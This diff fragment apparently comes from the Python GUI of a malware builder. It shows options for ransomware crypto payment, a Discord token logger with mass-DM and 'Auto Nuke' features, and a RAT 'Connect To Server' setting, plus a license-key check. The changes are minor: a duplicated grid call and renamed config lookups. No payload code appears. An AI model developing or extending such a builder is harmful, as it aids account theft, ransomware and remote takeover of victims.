@@ -129,6 +129,7 @@ class App(customtkinter.CTk):
 
         submit = customtkinter.CTkButton(key_frame, text='Submit', command=lambda: self.verify_key(key_entry.get(), response_label))
         submit.grid(row=8, column=9, padx=0, pady=20, sticky="nesw")
+        submit.grid(row=8, column=9, padx=0, pady=20, sticky="nesw")
     
 
     def verify_key(self, key, label):
@@ -238,10 +239,10 @@ class App(customtkinter.CTk):
             crypto_type = ransomware_config['Crypto Currency'].get()
 
         token_logger = discord_config['Token Logger'].get()
-        if token_logger:
-            massdm = token_logger['MassDM'].get()
-            massdm_script = token_logger['MassDM Script'].get()
-            auto_nuke = token_logger['Auto Nuke'].get()
+        if discord_config:
+            massdm = discord_config['MassDM'].get()
+            massdm_script = discord_config['MassDM Script'].get()
+            auto_nuke = discord_config['Auto Nuke'].get()
         
         rat_client = connection_config['Connect To Server'].get()
         if rat_client:
